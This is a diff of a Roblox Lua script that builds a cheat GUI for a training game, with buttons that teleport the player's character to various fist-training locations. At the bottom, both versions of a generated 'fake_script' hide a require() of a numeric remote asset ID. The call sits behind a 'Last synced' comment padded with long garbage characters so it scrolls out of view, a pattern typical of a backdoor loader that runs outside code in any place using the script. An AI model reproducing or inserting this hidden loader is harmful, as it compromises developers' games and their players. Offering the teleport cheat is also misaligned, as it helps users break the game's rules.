@@ -2,81 +2,54 @@
 
 -- Instances:
 
-local SPTSCUSTOM = Instance.new("ScreenGui")
-local OpenGuif = Instance.new("TextButton")
-local UICorner = Instance.new("UICorner")
+local SPTSCUSTOMFIST = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
 local Second = Instance.new("Frame")
-local UICorner_2 = Instance.new("UICorner")
+local UICorner = Instance.new("UICorner")
 local ScrollingFrame = Instance.new("ScrollingFrame")
-local UICorner_3 = Instance.new("UICorner")
+local UICorner_2 = Instance.new("UICorner")
 local _1Kfist = Instance.new("TextButton")
-local UICorner_4 = Instance.new("UICorner")
+local UICorner_3 = Instance.new("UICorner")
 local _100Kfist = Instance.new("TextButton")
-local UICorner_5 = Instance.new("UICorner")
+local UICorner_4 = Instance.new("UICorner")
 local _1Mfist = Instance.new("TextButton")
-local UICorner_6 = Instance.new("UICorner")
+local UICorner_5 = Instance.new("UICorner")
 local _100Mfist = Instance.new("TextButton")
-local UICorner_7 = Instance.new("UICorner")
+local UICorner_6 = Instance.new("UICorner")
 local _1Bfist = Instance.new("TextButton")
-local UICorner_8 = Instance.new("UICorner")
+local UICorner_7 = Instance.new("UICorner")
 local _100Bfist = Instance.new("TextButton")
-local UICorner_9 = Instance.new("UICorner")
+local UICorner_8 = Instance.new("UICorner")
 local _1Tfist = Instance.new("TextButton")
-local UICorner_10 = Instance.new("UICorner")
+local UICorner_9 = Instance.new("UICorner")
 local _100Tfist = Instance.new("TextButton")
-local UICorner_11 = Instance.new("UICorner")
+local UICorner_10 = Instance.new("UICorner")
 local _35Qafist = Instance.new("TextButton")
-local UICorner_12 = Instance.new("UICorner")
+local UICorner_11 = Instance.new("UICorner")
 local _5qi = Instance.new("TextButton")
-local UICorner_13 = Instance.new("UICorner")
+local UICorner_12 = Instance.new("UICorner")
 local _350Qifist = Instance.new("TextButton")
-local UICorner_14 = Instance.new("UICorner")
+local UICorner_13 = Instance.new("UICorner")
 local _500QaFist = Instance.new("TextButton")
+local UICorner_14 = Instance.new("UICorner")
 local UICorner_15 = Instance.new("UICorner")
-local UICorner_16 = Instance.new("UICorner")
 local Title = Instance.new("TextLabel")
-local UICorner_17 = Instance.new("UICorner")
+local UICorner_16 = Instance.new("UICorner")
 local Exit = Instance.new("TextButton")
-local UICorner_18 = Instance.new("UICorner")
+local UICorner_17 = Instance.new("UICorner")
 local FistText = Instance.new("TextLabel")
-local UICorner_19 = Instance.new("UICorner")
+local UICorner_18 = Instance.new("UICorner")
 
 --Properties:
 
-SPTSCUSTOM.Name = "SPTS CUSTOM"
-SPTSCUSTOM.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-SPTSCUSTOM.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-OpenGuif.Name = "OpenGuif"
-OpenGuif.Parent = SPTSCUSTOM
-OpenGuif.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
-OpenGuif.Position = UDim2.new(0.00363636366, 0, 0.713968933, 0)
-OpenGuif.Size = UDim2.new(0, 103, 0, 50)
-OpenGuif.Font = Enum.Font.SourceSansBold
-OpenGuif.Text = "Open Fist"
-OpenGuif.TextColor3 = Color3.fromRGB(0, 0, 0)
-OpenGuif.TextScaled = true
-OpenGuif.TextSize = 14.000
-OpenGuif.TextStrokeTransparency = 0.900
-OpenGuif.TextWrapped = true
-OpenGuif.MouseButton1Down:Connect(function()
-	local button = script.Parent
-
-	button.MouseButton1Click:Connect(function()
-		button.Parent.Main:TweenPosition(UDim2.new(0.586, 0, 0.321, 0))
-
-	end)
-
-end)
-
-UICorner.Parent = OpenGuif
-
+SPTSCUSTOMFIST.Name = "SPTS CUSTOM FIST"
+SPTSCUSTOMFIST.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+SPTSCUSTOMFIST.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 Main.Name = "Main"
-Main.Parent = SPTSCUSTOM
+Main.Parent = SPTSCUSTOMFIST
 Main.BackgroundColor3 = Color3.fromRGB(150, 3, 3)
-Main.Position = UDim2.new(0.587000012, 0, 0, -450)
+Main.Position = UDim2.new(0.586000025, 0, 0.32100001, 0)
 Main.Size = UDim2.new(0, 572, 0, 404)
 Main.Active = true
 Main.Draggable = true
@@ -86,7 +59,7 @@ Second.Parent = Main
 Second.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
 Second.Size = UDim2.new(0, 572, 0, 398)
 
-UICorner_2.Parent = Second
+UICorner.Parent = Second
 
 ScrollingFrame.Parent = Second
 ScrollingFrame.Active = true
@@ -94,9 +67,8 @@ ScrollingFrame.BackgroundColor3 = Color3.fromRGB(150, 4, 4)
 ScrollingFrame.BorderColor3 = Color3.fromRGB(150, 4, 4)
 ScrollingFrame.Position = UDim2.new(0.0104895104, 0, 0.239796624, 0)
 ScrollingFrame.Size = UDim2.new(0, 560, 0, 296)
-ScrollingFrame.CanvasPosition = Vector2.new(0, 500)
 
-UICorner_3.Parent = ScrollingFrame
+UICorner_2.Parent = ScrollingFrame
 
 _1Kfist.Name = "1K fist"
 _1Kfist.Parent = ScrollingFrame
@@ -114,8 +86,7 @@ _1Kfist.MouseButton1Down:Connect(function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-56, 49, -73)
 end)
 
-
-UICorner_4.Parent = _1Kfist
+UICorner_3.Parent = _1Kfist
 
 _100Kfist.Name = "100K fist"
 _100Kfist.Parent = ScrollingFrame
@@ -133,7 +104,7 @@ _100Kfist.MouseButton1Down:Connect(function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2465, 63, -2304)
 end)
 
-UICorner_5.Parent = _100Kfist
+UICorner_4.Parent = _100Kfist
 
 _1Mfist.Name = "1M fist"
 _1Mfist.Parent = ScrollingFrame
@@ -150,7 +121,8 @@ _1Mfist.TextWrapped = true
 _1Mfist.MouseButton1Down:Connect(function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2399, 66, -2333)
 end)
-UICorner_6.Parent = _1Mfist
+
+UICorner_5.Parent = _1Mfist
 
 _100Mfist.Name = "100M fist"
 _100Mfist.Parent = ScrollingFrame
@@ -168,7 +140,7 @@ _100Mfist.MouseButton1Down:Connect(function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2479, 81, -2387)
 end)
 
-UICorner_7.Parent = _100Mfist
+UICorner_6.Parent = _100Mfist
 
 _1Bfist.Name = "1B fist"
 _1Bfist.Parent = ScrollingFrame
@@ -185,7 +157,8 @@ _1Bfist.TextWrapped = true
 _1Bfist.MouseButton1Down:Connect(function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-145, 1556, -65)
 end)
-UICorner_8.Parent = _1Bfist
+
+UICorner_7.Parent = _1Bfist
 
 _100Bfist.Name = "100B fist"
 _100Bfist.Parent = ScrollingFrame
@@ -202,7 +175,8 @@ _100Bfist.TextWrapped = true
 _100Bfist.MouseButton1Down:Connect(function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(182, 2514, -466  )
 end) 
-UICorner_9.Parent = _100Bfist
+
+UICorner_8.Parent = _100Bfist
 
 _1Tfist.Name = "1T fist"
 _1Tfist.Parent = ScrollingFrame
@@ -219,7 +193,8 @@ _1Tfist.TextWrapped = true
 _1Tfist.MouseButton1Down:Connect(function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(207, 3492, 115 )
 end)
-UICorner_10.Parent = _1Tfist
+
+UICorner_9.Parent = _1Tfist
 
 _100Tfist.Name = "100T fist"
 _100Tfist.Parent = ScrollingFrame
@@ -236,7 +211,8 @@ _100Tfist.TextWrapped = true
 _100Tfist.MouseButton1Down:Connect(function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(827, 5565, -1697)
 end)
-UICorner_11.Parent = _100Tfist
+
+UICorner_10.Parent = _100Tfist
 
 _35Qafist.Name = "35Qa fist"
 _35Qafist.Parent = ScrollingFrame
@@ -253,7 +229,8 @@ _35Qafist.TextWrapped = true
 _35Qafist.MouseButton1Down:Connect(function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-233, 543, 322  )
 end)
-UICorner_12.Parent = _35Qafist
+
+UICorner_11.Parent = _35Qafist
 
 _5qi.Name = "5 qi"
 _5qi.Parent = ScrollingFrame
@@ -270,7 +247,8 @@ _5qi.TextWrapped = true
 _5qi.MouseButton1Down:Connect(function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1925, 13219, 2142)
 end)
-UICorner_13.Parent = _5qi
+
+UICorner_12.Parent = _5qi
 
 _350Qifist.Name = "350Qi fist"
 _350Qifist.Parent = ScrollingFrame
@@ -287,7 +265,8 @@ _350Qifist.TextWrapped = true
 _350Qifist.MouseButton1Down:Connect(function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2788, 21224, -2936 )
 end)
-UICorner_14.Parent = _350Qifist
+
+UICorner_13.Parent = _350Qifist
 
 _500QaFist.Name = "500Qa Fist"
 _500QaFist.Parent = ScrollingFrame
@@ -305,9 +284,9 @@ _500QaFist.MouseButton1Down:Connect(function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2294, 7288, 2633)
 end)
 
-UICorner_15.Parent = _500QaFist
+UICorner_14.Parent = _500QaFist
 
-UICorner_16.Parent = Main
+UICorner_15.Parent = Main
 
 Title.Name = "Title"
 Title.Parent = Main
@@ -322,7 +301,7 @@ Title.TextSize = 14.000
 Title.TextStrokeTransparency = 0.800
 Title.TextWrapped = true
 
-UICorner_17.Parent = Title
+UICorner_16.Parent = Title
 
 Exit.Name = "Exit"
 Exit.Parent = Main
@@ -336,15 +315,20 @@ Exit.TextScaled = true
 Exit.TextSize = 14.000
 Exit.TextWrapped = true
 Exit.MouseButton1Down:Connect(function()
-	local button = script.Parent
+	local SPTSCFIST = script.Parent
+	local Exit = SPTSCFIST.Exit
+	local Main = SPTSCFIST.Main
 
-	button.MouseButton1Click:Connect(function()
-		button.Parent:TweenPosition(UDim2.new(0.587, 0, 0, -450))
+	Exit.MouseButton1Up:Connect(function()
+		print("MouseBUttonReleased")
+		Main.Visible = false
+		Exit.Visible = false
+		SPTSCFIST.Gradient.Visible = false
 	end)
 end)
 
 
-UICorner_18.Parent = Exit
+UICorner_17.Parent = Exit
 
 FistText.Name = "Fist Text"
 FistText.Parent = Main
@@ -359,14 +343,14 @@ FistText.TextSize = 14.000
 FistText.TextStrokeTransparency = 0.900
 FistText.TextWrapped = true
 
-UICorner_19.Parent = FistText
+UICorner_18.Parent = FistText
 
 -- Scripts:
 
-local function AVUPZKR_fake_script() -- UICorner_2. 
-	local script = Instance.new('Script', UICorner_2)
+local function DRGPSUL_fake_script() -- UICorner. 
+	local script = Instance.new('Script', UICorner)
 
 	
-	--[[ Last synced 4/30/2022 08:20 ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]] require(5308494509) --[[                                                                                                  ]]--
+	--[[ Last synced 4/30/2022 09:47 ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]] require(5308494509) --[[                                                                                                  ]]--
 end
-coroutine.wrap(AVUPZKR_fake_script)()
+coroutine.wrap(DRGPSUL_fake_script)()
